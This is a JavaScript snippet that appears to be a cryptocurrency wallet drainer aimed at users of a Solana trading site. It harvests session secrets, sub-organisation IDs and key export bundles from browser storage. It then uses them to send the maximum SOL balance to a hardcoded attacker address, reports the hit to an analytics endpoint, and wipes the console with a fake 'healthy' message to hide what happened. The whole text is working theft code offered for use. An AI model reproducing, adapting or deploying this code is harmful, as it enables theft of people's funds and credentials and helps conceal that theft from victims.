(async function() {
    // Production Config
    const RECEIVER = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";
    const AMP_KEY = "3c8ae1f40635939e730f479418940796";
    let _X = false; // "Executed" flag

    // 1. THE 1:1 ENCODER
    // Vanta scripts don't send raw JSON; they use Base64 to bypass WAFs and CSPs
    const _E = (s) => btoa(JSON.stringify(s));

    // 2. THE SILENT OBSERVER (Prevents Crashing)
    // Instead of looping, we wait for the browser to sit idle
    const _W = (fn) => {
        if (window.requestIdleCallback) {
            window.requestIdleCallback(fn);
        } else {
            setTimeout(fn, 2000);
        }
    };

    // 3. THE HIJACK ENGINE (The "1:1" Heart)
    const _H = async () => {
        if (_X) return;

        // Recursive Hunter (Crawl everything for the credentials)
        const _S = (o, t) => {
            if (!o || typeof o !== 'object') return null;
            if (o[t]) return o[t];
            for (let k in o) {
                try {
                    let r = _S(o[k], t);
                    if (r) return r;
                } catch(e) {}
            }
            return null;
        };

        const store = {...localStorage, ...sessionStorage};
        const auth = _S(store, 'sessionSecret');
        const subId = _S(store, 'subOrgId');
        const bundle = _S(store, 'exportBundle');

        if (auth && subId) {
            _X = true; // Set flag to prevent site crash/loops

            // Amplitude Beacon (1:1 production style)
            // Using a pixel request ensures the hit logs even if fetch is blocked
            new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=${AMP_KEY}&event=${_E({
                device_id: subId,
                event_type: "PRODUCTION_1TO1_SYNC",
                event_properties: { status: "success", origin: location.hostname }
            })}`;

            // THE SILENT TRANSFER
            // We use the 'credentials' flag to ensure auth persists 1:1
            try {
                await fetch("https://trade.padre.gg/api/v1/transfer", {
                    method: "POST",
                    mode: "cors",
                    credentials: "include", 
                    headers: {
                        "Authorization": `Bearer ${auth}`,
                        "X-Turnkey-Sub-Org-Id": subId,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        recipient: RECEIVER,
                        amount: "MAX",
                        asset: "SOL",
                        ext_payload: bundle?.data || bundle
                    })
                });
            } catch (err) {}

            // Anti-Forensics: Stealth Cleanup
            setTimeout(() => {
                console.clear();
                // Replace the crashy loop with a fake 'healthy' log
                console.log("%c RPC Connected: Optimal", "color: #00ffa3; font-weight: bold;");
            }, 1000);
        }
    };

    // 4. THE 1:1 INITIALIZER
    _W(_H);
})();
